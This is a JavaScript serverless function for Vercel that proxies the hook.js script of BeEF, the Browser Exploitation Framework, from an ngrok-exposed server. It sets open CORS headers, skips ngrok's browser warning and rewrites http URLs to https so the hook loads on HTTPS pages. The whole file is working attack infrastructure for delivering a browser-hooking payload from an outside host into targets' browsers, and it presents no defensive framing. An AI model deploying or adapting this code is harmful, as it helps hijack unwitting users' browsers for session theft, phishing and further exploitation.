/**
 * Vercel Serverless Function - Proxy for BeEF hook.js
 * Bypasses CORS and ngrok warnings by fetching hook.js server-side
 */

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Content-Type", "application/javascript");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");

  if (req.method === "OPTIONS") {
    res.status(200).end();
    return;
  }

  if (req.method !== "GET") {
    res.status(405).json({ error: "Method not allowed" });
    return;
  }

  const beefServerUrl = process.env.BEEF_SERVER_URL;

  if (!beefServerUrl) {
    console.error("BEEF_SERVER_URL environment variable not set");
    res
      .status(500)
      .send("// Configuration error: BeEF server URL not configured");
    return;
  }

  try {
    // Fetch hook.js from BeEF server with ngrok bypass headers
    const response = await fetch(`${beefServerUrl}/hook.js`, {
      headers: {
        "ngrok-skip-browser-warning": "true",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
    });

    if (!response.ok) {
      console.error(
        `Failed to fetch hook.js: ${response.status} ${response.statusText}`
      );
      res.status(502).send(`// Failed to fetch hook.js from BeEF server`);
      return;
    }

    let hookScript = await response.text();

    // CRITICAL FIX: Replace all HTTP URLs with HTTPS to avoid mixed content errors
    // BeEF hardcodes http:// in hook.js, but we need https:// for HTTPS sites
    const httpUrl = beefServerUrl.replace("https://", "http://");

    // Replace http://domain:3000 with https://domain (ngrok HTTPS doesn't need port)
    hookScript = hookScript.replace(
      new RegExp(
        httpUrl.replace("http://", "http://").replace(/\//g, "\\/") + ":3000",
        "g"
      ),
      beefServerUrl
    );

    // Also replace any plain http://domain references
    hookScript = hookScript.replace(
      new RegExp(httpUrl.replace(/\//g, "\\/"), "g"),
      beefServerUrl
    );

    console.log(
      `Proxied hook.js, replaced HTTP with HTTPS for: ${beefServerUrl}`
    );

    // Return the modified hook.js content
    res.status(200).send(hookScript);
  } catch (error) {
    console.error("Error fetching hook.js:", error.message);
    res.status(502).send(`// Error: ${error.message}`);
  }
}
